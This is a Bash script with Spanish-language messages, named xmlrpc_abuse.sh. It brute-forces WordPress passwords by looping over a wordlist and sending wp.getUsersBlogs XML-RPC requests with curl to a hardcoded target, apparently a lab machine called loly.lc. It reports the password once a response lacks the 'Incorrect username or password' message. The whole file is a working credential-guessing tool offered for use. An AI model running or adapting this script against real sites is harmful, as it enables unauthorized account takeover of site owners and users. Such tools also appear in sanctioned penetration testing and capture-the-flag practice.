#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
orangeColour="\e[38;5;208m\033[1m"
whiteColour="\e[0;97m\033[1m"
whiteUltra="\e[38;5;231m"


trap ctrl_c INT

function ctrl_c(){

	echo -e "\n${redColour}[!]${endColour} Saliendo...\n"
	tput cnorm;exit 1
}

function helpPanel(){
		echo -e "\n${yellowColour}[+]${endColour}${grayColour} Uso: ./xmlrpc_abuse.sh -u user -w wordlist${endColour}\n"
		echo -e "\t${purpleColour}u)${endColour}${blueColour} Especifica el usuario${endColour}\n"
		echo -e "\t${purpleColour}w)${endColour}${blueColour} Especifica la ruta del diccionario${endColour}\n"
		echo -e "\t${grayColour} Ejemplo: ./xmlrpc_abuse.sh -u user -w rockyou.txt${endColour}"
		tput cnorm;exit 0


}

function xmlrpc_abuse(){

	url="http://loly.lc/wordpress/xmlrpc.php"

	while read -r password;do

		data="<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>$user</value></param>
<param><value>$password</value></param>
</params>
</methodCall>"

		response=$(curl -s -X POST "$url" -d "$data")

		if echo "$response" | grep -q "Incorrect username or password."; then
			continue
		else
			echo -e "\n${greenColour}[+]${endColour}${blueColour} Contraseña encontrada ${endColour}[${greenColour}$password${endColour}]\n"
			tput cnorm;exit 0
		fi

	done < "$wordlist"


tput cnorm
}


#main
tput civis
declare -i parametro=0;while getopts ":u:w:h:" arg;do

	case $arg in

		u) user=$OPTARG;let parametro+=1;;

		w) wordlist=$OPTARG;let parametro+=1;;

		h)helpPanel

	esac
done

if [ $parametro == "0" ];then
	helpPanel
else

	xmlrpc_abuse

fi
